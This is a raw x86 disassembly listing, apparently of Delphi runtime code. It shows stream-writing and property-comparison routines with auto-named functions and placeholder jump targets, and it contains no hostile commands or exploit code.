pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e20e
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_41e270
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e46a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ee18
mov eax [ ebp - 0x4 ]
call sub_41c0f8
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
jmp [ eax * 4 + jump_table_41e2b2 ]
mov eax [ ebp - 0x4 ]
call sub_41db58
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc68
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412fa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc68
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412fa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc68
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412fa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca4c
mov eax ebx
call sub_4131a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca90
mov eax ebx
call sub_4131a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cad4
mov eax ebx
call sub_4131c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb24
mov eax ebx
call sub_4131b4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d9b8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4131dc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41da74
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413208
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
cmp al 0x9
sete dl
mov eax ebx
call sub_413178
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e0a8
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f140
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ccd4
push edx
push eax
mov eax ebx
call sub_4130a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e471
lea eax [ ebp - 0x1c ]
call sub_40ee2c
lea eax [ ebp - 0xc ]
call sub_404630
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov eax ebx
call sub_4144cc
jmp r-xdata
sub_41e478
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_41e644
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b584
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41e4b0
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42057c
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e4d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42057c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e5bc
sub_41e51c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aac4
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e644
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41aae4
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e570
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e644
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e5bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e633
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_4207c8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e570
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e63a
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_41e670
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e6b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404138
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4206c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6ba
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41e6c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e752
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_4207c8
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ef54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e759
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41ef4c
mov edx esi
mov eax edi
call sub_4192f8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41efa0
mov eax [ ebp - 0x4 ]
call sub_41ef54
inc esi
dec ebx
jne r-xdata
sub_41e760
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4185b0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407e4c
test al al
jne r-xdata
sub_41e7b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e8f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_4215f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e760
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4215c4
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_4215f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4215c4
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8fe
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4215c4
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4215c4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41e904
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ece0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030a4
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_404210
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e504
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e644
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41ef5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030a4
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_4041b4
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_4205e0
mov eax [ ebp - 0x8 ]
call sub_40309c
call sub_40337c
call sub_41476c
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_4041b4
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030a4
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_4041b4
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4042d0
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_4205e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41efa0
mov eax [ ebp - 0x4 ]
call sub_41ef54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41ec81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4205e0
mov eax [ ebp - 0x4 ]
call sub_41e504
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4185b0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec88
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41ec3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e7b0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e4a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_403350
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41ec88
mov eax [ ebp - 0x4 ]
call sub_41ef54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ece7
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_403f74
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e504
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e51c
sub_41ed04
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_4205d0
mov edx esi
mov eax ebx
call sub_41e7b0
pop esi
pop ebx
retn
sub_41ed2c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_4207c8
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e570
pop ebx
pop ebp
retn 0xc
sub_41ed50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_4207c8
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e570
pop ebx
pop ebp
retn 0x4
sub_41ed74
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_4207c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e570
pop ebx
pop ebp
retn 0x8
sub_41ed98
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_4207c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e570
pop ebx
pop ebp
retn 0x8
sub_41edbc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407e4c
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407e4c
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_4207c8
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407e4c
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_4207c8
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407e4c
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_4207c8
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_4207c8
mov edx esi
mov eax ebx
call sub_4205e0
mov dl 0xd
mov eax ebx
call sub_4207c8
jmp r-xdata
sub_41ee80
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e570
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e570
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e570
jmp r-xdata
pop edx
pop ebx
retn
sub_41eef4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_4207c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e570
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41ee80
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41ef5c
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e570
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41ee80
sub_41efa0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40337c
call sub_41476c
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f04d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40337c
mov edx [ ebp - 0x10 ]
call sub_414970
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4149c4
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420034
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f068
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40309c
mov edx eax
mov eax [ edi ]
call sub_403368
test al al
jne r-xdata
mov al 0x1
sub_41f098
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4149f4
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4149f4
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f0f0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414f24
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414f24
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f14c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415340
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415340
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f1a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f223
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414d68
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4047a8
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4047a8
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f22a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404648
retn
sub_41f234
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e4c
test al al
jne r-xdata
mov al 0x1
sub_41f274
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4149f4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f234
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f2cc
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4149f4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push ebp
call sub_41f274
pop ecx
test al al
jne r-xdata
mov eax ebx
